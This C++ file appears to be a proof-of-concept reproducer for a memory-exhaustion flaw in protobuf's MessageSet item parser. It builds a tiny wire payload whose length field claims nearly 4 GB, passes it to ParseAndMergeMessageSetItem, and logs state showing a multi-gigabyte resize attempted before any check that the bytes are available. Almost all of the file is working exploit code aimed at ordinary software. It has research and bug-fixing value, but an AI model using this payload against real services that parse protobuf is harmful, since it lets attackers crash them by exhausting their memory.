#include <cstddef>
#include <cstdint>
#include <exception>
#include <iomanip>
#include <iostream>
#include <mutex>
#include <sstream>
#include <string>

#include <google/protobuf/api.pb.h>
#include <google/protobuf/io/coded_stream.h>
#include <google/protobuf/message.h>
#include <google/protobuf/wire_format.h>
#include <google/protobuf/wire_format_lite.h>

namespace {

constexpr uint32_t kClaimedLength = 0xfffffff0u;
std::mutex g_log_mutex;

std::string EncodeVarint(uint64_t value) {
  std::string out;
  while (value >= 0x80) {
    out.push_back(static_cast<char>((value & 0x7f) | 0x80));
    value >>= 7;
  }
  out.push_back(static_cast<char>(value));
  return out;
}

std::string BuildMaliciousMessageSetItem() {
  std::string payload;
  payload.push_back(static_cast<char>(
      google::protobuf::internal::WireFormatLite::kMessageSetItemStartTag));
  payload.push_back(static_cast<char>(
      google::protobuf::internal::WireFormatLite::kMessageSetMessageTag));
  payload += EncodeVarint(kClaimedLength);
  return payload;
}

std::string HexPreview(const std::string& bytes) {
  std::ostringstream oss;
  oss << std::hex << std::setfill('0');
  for (unsigned char c : bytes) {
    oss << std::setw(2) << static_cast<unsigned int>(c) << ' ';
  }
  return oss.str();
}

void PrintState(const char* label, std::uint64_t value) {
  std::lock_guard<std::mutex> lock(g_log_mutex);
  std::cerr << "[STATE] " << label << " = " << value << " (0x" << std::hex
            << value << std::dec << ")\n";
}

}  // namespace

int main() {
  google::protobuf::Api message;
  const std::string wire = BuildMaliciousMessageSetItem();
  const uint32_t computed_size =
      static_cast<uint32_t>(
          kClaimedLength +
          google::protobuf::io::CodedOutputStream::VarintSize32(kClaimedLength));

  std::cerr << "=== PRINTF STATE CAPTURE ===\n";
  std::cerr << "Target function: "
            << "google::protobuf::internal::ParseMessageSetItemImpl\n";
  std::cerr << "Wire size=" << wire.size() << " bytes\n";
  std::cerr << "Wire hex=" << HexPreview(wire) << "\n";
  PrintState("claimed_length", kClaimedLength);
  PrintState("varint_size32(claimed_length)",
             google::protobuf::io::CodedOutputStream::VarintSize32(
                 kClaimedLength));
  PrintState("computed_message_data_size", computed_size);

  google::protobuf::io::CodedInputStream input(
      reinterpret_cast<const uint8_t*>(wire.data()),
      static_cast<int>(wire.size()));
  const uint32_t start_tag = input.ReadTag();

  PrintState("start_tag", start_tag);
  PrintState("input.CurrentPosition() after start tag",
             static_cast<uint64_t>(input.CurrentPosition()));
  PrintState("input.BytesUntilLimit() before parse",
             static_cast<uint64_t>(input.BytesUntilLimit()));
  PrintState("input.BytesUntilTotalBytesLimit() before parse",
             static_cast<uint64_t>(input.BytesUntilTotalBytesLimit()));

  if (start_tag !=
      google::protobuf::internal::WireFormatLite::kMessageSetItemStartTag) {
    std::cerr << "[FAIL] start tag mismatch, not exercising MessageSet path\n";
    return 2;
  }

  std::cerr << "[ACTION] Calling ParseAndMergeMessageSetItem(); next step in "
               "the vulnerable branch is message_data.resize("
            << computed_size << ")\n";

  try {
    const bool ok = google::protobuf::internal::WireFormat::
        ParseAndMergeMessageSetItem(&input, &message);
    std::cerr << "[RESULT] ParseAndMergeMessageSetItem returned " << ok << "\n";
  } catch (const std::bad_alloc&) {
    std::cerr << "[RESULT] Caught std::bad_alloc during parse\n";
  } catch (const std::length_error& ex) {
    std::cerr << "[RESULT] Caught std::length_error during parse: " << ex.what()
              << "\n";
  }

  PrintState("requested_resize_argument", computed_size);
  PrintState("bytes_missing_for_claimed_payload",
             static_cast<uint64_t>(kClaimedLength) -
                 static_cast<uint64_t>(input.BytesUntilLimit()));
  std::cerr << "[BUG] Remaining bytes are tiny, but the parser-derived resize "
               "target is multi-gigabyte before any ReadRaw() availability "
               "check\n";

  PrintState("input.BytesUntilLimit() after parse attempt",
             static_cast<uint64_t>(input.BytesUntilLimit()));
  return 0;
}
